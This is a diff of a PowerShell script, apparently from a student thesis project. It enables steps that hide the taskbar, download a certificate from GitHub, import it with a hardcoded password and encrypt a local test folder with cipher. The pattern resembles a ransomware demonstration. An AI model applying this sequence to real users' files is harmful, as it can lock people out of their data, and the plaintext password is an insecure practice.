@@ -53,29 +53,29 @@ Sleep 2
 $taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
 [Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)
 
-# # Define the URL of the file to download
-# $fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"
+# Define the URL of the file to download
+$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"
 
-# # Define the path where the file will be saved
-# $outputPath = "C:\Users\ionut\Downloads\certificate.pfx"
+# Define the path where the file will be saved
+$outputPath = "C:\Users\ionut\Downloads\certificate.pfx"
 
-# # Download the file
-# Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
+# Download the file
+Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
 
-# # Define the path to the certificate and the password
-# $certPath = "C:\Users\ionut\Downloads\certificate.pfx"
-# $certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText
+# Define the path to the certificate and the password
+$certPath = "C:\Users\ionut\Downloads\certificate.pfx"
+$certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText
 
 
-# # Import the certificate
-# $cert = Import-PfxCertificate -FilePath $certPath -CertStoreLocation "Cert:\CurrentUser\My" -Password $certPassword
+# Import the certificate
+$cert = Import-PfxCertificate -FilePath $certPath -CertStoreLocation "Cert:\CurrentUser\My" -Password $certPassword
 
-# # Output the thumbprint of the imported certificate
-# $certThumbprint = $cert.Thumbprint
-# Write-Host "Imported certificate with thumbprint: $certThumbprint"
+# Output the thumbprint of the imported certificate
+$certThumbprint = $cert.Thumbprint
+Write-Host "Imported certificate with thumbprint: $certThumbprint"
 
-# # Define the path to the folder to be encrypted
-# $folderPath = "C:\Users\ionut\Desktop\Test"
+# Define the path to the folder to be encrypted
+$folderPath = "C:\Users\ionut\Desktop\Test"
 
 # Encrypt the folder
 cipher /E /S:"$folderPath"
